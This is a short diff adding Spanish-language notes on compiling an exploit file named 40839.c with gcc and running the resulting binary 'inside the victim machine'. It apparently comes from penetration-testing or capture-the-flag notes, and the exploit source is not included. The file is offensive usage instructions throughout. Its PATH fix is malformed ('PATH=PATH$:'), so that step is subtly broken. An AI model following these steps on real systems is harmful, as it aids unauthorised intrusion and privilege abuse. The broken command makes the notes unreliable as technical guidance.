@@ -1,0 +1,11 @@
+#Compilarlo dentro de la maquina victima
+
+$ gcc -pthread 40839.c -o exploit -lcrypt
+
+#Si diera error al compilarlo hacer lo siguiente...
+
+$ PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH
+
+#Ejecutarlo dentro de la maquina victima
+
+$ ./exploit
